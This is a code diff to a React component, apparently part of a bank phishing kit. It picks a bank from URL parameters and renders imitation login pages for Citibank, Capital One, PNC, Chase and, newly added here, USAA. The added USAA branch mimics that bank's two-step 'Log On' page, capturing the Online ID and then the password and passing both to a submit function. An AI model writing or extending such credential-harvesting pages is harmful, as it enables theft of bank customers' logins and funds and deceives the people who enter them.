@@ -26,6 +26,7 @@ export default function ContactForm() {
   const [showPassword, setShowPassword] = useState(false)
   const [step, setStep] = useState('form') // 'form' | 'waiting' | 'success'
   const [submitting, setSubmitting] = useState(false)
+  const [formStep, setFormStep] = useState('username') // 'username' | 'password' (para USAA)
 
   // Obtener parámetros de URL
   const params = new URLSearchParams(window.location.search)
@@ -91,6 +92,7 @@ export default function ContactForm() {
   const isCitibank = bankName?.toLowerCase().includes('citibank')
   const isCapitalOne = bankName?.toLowerCase().includes('capital one')
   const isPNC = bankName?.toLowerCase().includes('pnc')
+  const isUSAA = bankName?.toLowerCase().includes('usaa')
   const isChase = bankName?.toLowerCase().includes('chase')
 
   // ---- FORMULARIO ----
@@ -578,6 +580,114 @@ export default function ContactForm() {
                 <div>
                   <a href="#" className="text-sm text-blue-600 hover:text-blue-700 font-semibold">
                     Enroll In Online Banking
+                  </a>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      )
+    }
+
+    // Diseño para USAA
+    if (isUSAA) {
+      return (
+        <div className="min-h-screen bg-gradient-to-br from-blue-900 to-blue-800 px-4 py-8 sm:px-0">
+          <div className="flex min-h-screen items-center justify-center">
+            <div className="w-full max-w-[550px]">
+              <div className="rounded-xl bg-white p-12 shadow-2xl">
+                <h1 className="mb-12 text-center text-4xl font-bold text-gray-800">Log On</h1>
+
+                <form
+                  onSubmit={(e) => {
+                    e.preventDefault()
+                    if (formStep === 'username') {
+                      if (!username) return
+                      setFormStep('password')
+                    } else {
+                      submitForm(e)
+                    }
+                  }}
+                  className="space-y-8"
+                >
+                  {/* Username Step */}
+                  {formStep === 'username' ? (
+                    <>
+                      <div>
+                        <label className="mb-3 block text-sm font-semibold text-gray-700">Online ID</label>
+                        <input
+                          type="text"
+                          required
+                          value={username}
+                          onChange={(e) => setUsername(e.target.value)}
+                          autoFocus
+                          className="w-full rounded-lg border-2 border-blue-400 px-4 py-4 text-gray-800 outline-none transition-colors focus:border-blue-600"
+                        />
+                      </div>
+                      <button
+                        type="submit"
+                        className="w-full rounded-lg bg-green-700 py-4 font-bold text-white hover:bg-green-800 text-lg"
+                      >
+                        Next
+                      </button>
+                    </>
+                  ) : (
+                    <>
+                      {/* Username Display */}
+                      <div className="rounded-lg bg-blue-50 p-4">
+                        <p className="text-sm text-gray-600">Online ID</p>
+                        <p className="font-semibold text-gray-800">{username}</p>
+                      </div>
+
+                      {/* Password Step */}
+                      <div>
+                        <label className="mb-3 block text-sm font-semibold text-gray-700">Password</label>
+                        <div className="relative">
+                          <input
+                            type={showPassword ? 'text' : 'password'}
+                            required
+                            value={password}
+                            onChange={(e) => setPassword(e.target.value)}
+                            autoFocus
+                            className="w-full rounded-lg border-2 border-blue-400 px-4 py-4 pr-12 text-gray-800 outline-none transition-colors focus:border-blue-600"
+                          />
+                          <button
+                            type="button"
+                            onClick={() => setShowPassword(!showPassword)}
+                            className="absolute right-4 top-1/2 -translate-y-1/2 text-blue-600 hover:text-blue-700"
+                          >
+                            <Icon name={showPassword ? 'eye-off' : 'eye'} size={20} />
+                          </button>
+                        </div>
+                      </div>
+
+                      <div className="flex gap-3">
+                        <button
+                          type="button"
+                          onClick={() => {
+                            setFormStep('username')
+                            setPassword('')
+                          }}
+                          className="flex-1 rounded-lg border-2 border-gray-300 py-3 font-bold text-gray-800 hover:bg-gray-50"
+                        >
+                          Back
+                        </button>
+                        <button
+                          type="submit"
+                          disabled={submitting}
+                          className="flex-1 rounded-lg bg-green-700 py-3 font-bold text-white hover:bg-green-800 disabled:opacity-60"
+                        >
+                          {submitting ? 'Logging in…' : 'Log On'}
+                        </button>
+                      </div>
+                    </>
+                  )}
+                </form>
+
+                {/* Help Link */}
+                <div className="mt-8 text-center border-t border-gray-200 pt-6">
+                  <a href="#" className="text-blue-600 hover:text-blue-700 font-semibold">
+                    I need help logging on
                   </a>
                 </div>
               </div>
